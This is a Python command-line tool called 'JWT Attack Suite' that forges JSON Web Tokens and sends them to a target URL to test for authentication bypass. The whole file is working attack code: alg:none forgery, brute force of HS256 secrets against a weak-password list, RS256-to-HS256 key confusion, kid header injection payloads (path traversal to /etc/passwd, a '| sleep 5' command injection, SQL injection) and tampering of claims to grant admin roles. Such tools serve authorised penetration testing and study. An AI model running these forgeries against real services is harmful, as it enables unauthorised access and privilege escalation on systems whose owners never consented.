#!/usr/bin/env python3
"""
JWT Attack Suite - by amooryx
A comprehensive CLI tool for testing JWT vulnerabilities.
"""

import base64
import hashlib
import hmac
import json
import sys
import argparse
import itertools
import string
from typing import Optional

try:
    import requests
    import httpx
except ImportError:
    print("[!] Missing deps: pip install requests httpx")
    sys.exit(1)


BANNER = r"""
     _ __        __  ___   __  __            __      _____       _ __     
    (_) /  ___  /  |/  /  / / / /___  ____  / /__   / ___/__  __(_) /____ 
   / / /  / _ \/ /|_/ /  / /_/ / __ \/ __ \/ //_/   \__ \/ / / / / __/ _ \
  / / /__/  __/ /  / /  / __  / /_/ / /_/ / ,<     ___/ / /_/ / / /_/  __/
 /_/____/\___/_/  /_/  /_/ /_/\____/\____/_/|_|   /____/\__,_/_/\__/\___/ 
                                                                            
  JWT Attack Suite v1.0 | by amooryx
"""

# ─────────────────────────────────────────────
#  Helpers
# ─────────────────────────────────────────────

def b64url_decode(data: str) -> bytes:
    padding = 4 - len(data) % 4
    return base64.urlsafe_b64decode(data + "=" * padding)


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def decode_token(token: str):
    parts = token.split(".")
    if len(parts) != 3:
        print("[!] Invalid JWT format")
        sys.exit(1)
    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
    except Exception as e:
        print(f"[!] Failed to decode token: {e}")
        sys.exit(1)
    return header, payload, parts


def print_token_info(token: str):
    header, payload, _ = decode_token(token)
    print("\n[*] Token Decoded:")
    print(f"  Header  : {json.dumps(header, indent=4)}")
    print(f"  Payload : {json.dumps(payload, indent=4)}")


# ─────────────────────────────────────────────
#  Attack 1: alg:none
# ─────────────────────────────────────────────

def attack_alg_none(token: str, url: Optional[str], header_name: str) -> str:
    print("\n[*] Attack: alg:none")
    header, payload, _ = decode_token(token)

    for alg_val in ["none", "None", "NONE", "nOnE"]:
        header["alg"] = alg_val
        new_header = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        new_payload = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        forged = f"{new_header}.{new_payload}."

        print(f"  [+] Forged token (alg={alg_val}): {forged[:60]}...")

        if url:
            _send_and_report(url, header_name, forged, f"alg:{alg_val}")

    return forged


# ─────────────────────────────────────────────
#  Attack 2: Weak Secret Brute Force (HS256)
# ─────────────────────────────────────────────

COMMON_SECRETS = [
    "secret", "password", "123456", "qwerty", "admin", "test",
    "changeme", "jwt_secret", "supersecret", "mysecret", "key",
    "private", "token", "letmein", "welcome", "12345678", "abc123",
]


def sign_hs256(header_b64: str, payload_b64: str, secret: str) -> str:
    msg = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
    return b64url_encode(sig)


def attack_brute_force(token: str, wordlist: Optional[str], url: Optional[str], header_name: str):
    print("\n[*] Attack: Weak Secret Brute Force (HS256)")
    _, _, parts = decode_token(token)
    header_b64, payload_b64, sig_b64 = parts

    secrets = COMMON_SECRETS.copy()
    if wordlist:
        try:
            with open(wordlist, "r", errors="ignore") as f:
                secrets += [line.strip() for line in f if line.strip()]
            print(f"  [+] Loaded {len(secrets)} secrets from wordlist")
        except FileNotFoundError:
            print(f"  [!] Wordlist not found: {wordlist}")

    for secret in secrets:
        computed = sign_hs256(header_b64, payload_b64, secret)
        if computed == sig_b64:
            print(f"  [!!!] SECRET FOUND: '{secret}'")
            if url:
                _send_and_report(url, header_name, token, f"brute({secret})")
            return secret

    print("  [-] No weak secret found in list")
    return None


# ─────────────────────────────────────────────
#  Attack 3: RS256 → HS256 Confusion
# ─────────────────────────────────────────────

def attack_rs256_hs256(token: str, pubkey_file: str, url: Optional[str], header_name: str):
    print("\n[*] Attack: RS256 → HS256 Algorithm Confusion")
    try:
        with open(pubkey_file, "rb") as f:
            pubkey = f.read()
    except FileNotFoundError:
        print(f"  [!] Public key file not found: {pubkey_file}")
        return

    header, payload, _ = decode_token(token)
    header["alg"] = "HS256"

    new_header = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    new_payload = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())

    msg = f"{new_header}.{new_payload}".encode()
    sig = hmac.new(pubkey, msg, hashlib.sha256).digest()
    forged = f"{new_header}.{new_payload}.{b64url_encode(sig)}"

    print(f"  [+] Forged token (RS256→HS256): {forged[:60]}...")

    if url:
        _send_and_report(url, header_name, forged, "RS256→HS256")

    return forged


# ─────────────────────────────────────────────
#  Attack 4: kid Header Injection
# ─────────────────────────────────────────────

KID_PAYLOADS = [
    "../../dev/null",
    "/dev/null",
    "| sleep 5",
    "'; SELECT 1--",
    "../../../etc/passwd",
    "/proc/self/fd/0",
]


def attack_kid_injection(token: str, url: Optional[str], header_name: str):
    print("\n[*] Attack: kid Header Injection")
    header, payload, _ = decode_token(token)

    for kid_val in KID_PAYLOADS:
        header["kid"] = kid_val
        # sign with empty string (null key path exploitation)
        new_header = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        new_payload = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        sig = sign_hs256(new_header, new_payload, "")
        forged = f"{new_header}.{new_payload}.{sig}"

        print(f"  [+] kid='{kid_val}' → {forged[:50]}...")

        if url:
            _send_and_report(url, header_name, forged, f"kid={kid_val}")


# ─────────────────────────────────────────────
#  Attack 5: Claim Tampering (privilege escalation)
# ─────────────────────────────────────────────

def attack_claim_tamper(token: str, claims: dict, url: Optional[str], header_name: str):
    print("\n[*] Attack: Claim Tampering (unsigned modification)")
    header, payload, _ = decode_token(token)

    print(f"  [*] Original claims: {payload}")
    payload.update(claims)
    print(f"  [+] Modified claims: {payload}")

    # Forge with alg:none
    header["alg"] = "none"
    new_header = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    new_payload = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    forged = f"{new_header}.{new_payload}."

    print(f"  [+] Forged token: {forged[:60]}...")

    if url:
        _send_and_report(url, header_name, forged, "claim-tamper")

    return forged


# ─────────────────────────────────────────────
#  HTTP Helper
# ─────────────────────────────────────────────

def _send_and_report(url: str, header_name: str, token: str, attack_name: str):
    try:
        headers = {header_name: f"Bearer {token}"}
        r = requests.get(url, headers=headers, timeout=10, verify=False)
        status = r.status_code
        indicator = "✓ POSSIBLE BYPASS" if status in [200, 201, 302] else "✗ Rejected"
        print(f"    → [{attack_name}] HTTP {status} {indicator}")
    except requests.exceptions.RequestException as e:
        print(f"    → [{attack_name}] Request failed: {e}")


# ─────────────────────────────────────────────
#  CLI
# ─────────────────────────────────────────────

def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="JWT Attack Suite - Test JWTs for common vulnerabilities",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-t", "--token", required=True, help="JWT token to test")
    parser.add_argument("-u", "--url", help="Target URL to send forged tokens to")
    parser.add_argument("-H", "--header", default="Authorization", help="HTTP header name (default: Authorization)")
    parser.add_argument("-w", "--wordlist", help="Path to wordlist for brute force")
    parser.add_argument("-p", "--pubkey", help="Public key file for RS256→HS256 attack")
    parser.add_argument("--set-claim", nargs=2, action="append", metavar=("KEY", "VALUE"),
                        help="Tamper a claim: --set-claim role admin")
    parser.add_argument("--attack", default="all",
                        choices=["all", "none", "brute", "rs256", "kid", "tamper"],
                        help="Which attack to run (default: all)")
    parser.add_argument("--info", action="store_true", help="Just decode and display token info")

    args = parser.parse_args()

    if args.info:
        print_token_info(args.token)
        return

    print_token_info(args.token)

    run_all = args.attack == "all"

    if run_all or args.attack == "none":
        attack_alg_none(args.token, args.url, args.header)

    if run_all or args.attack == "brute":
        attack_brute_force(args.token, args.wordlist, args.url, args.header)

    if (run_all or args.attack == "rs256") and args.pubkey:
        attack_rs256_hs256(args.token, args.pubkey, args.url, args.header)
    elif args.attack == "rs256" and not args.pubkey:
        print("[!] RS256→HS256 attack requires --pubkey")

    if run_all or args.attack == "kid":
        attack_kid_injection(args.token, args.url, args.header)

    if run_all or args.attack == "tamper":
        claims = {}
        if args.set_claim:
            for key, val in args.set_claim:
                # try to cast to int/bool if possible
                if val.lower() == "true":
                    val = True
                elif val.lower() == "false":
                    val = False
                elif val.isdigit():
                    val = int(val)
                claims[key] = val
        else:
            claims = {"role": "admin", "is_admin": True}

        attack_claim_tamper(args.token, claims, args.url, args.header)

    print("\n[*] Done.")


if __name__ == "__main__":
    main()
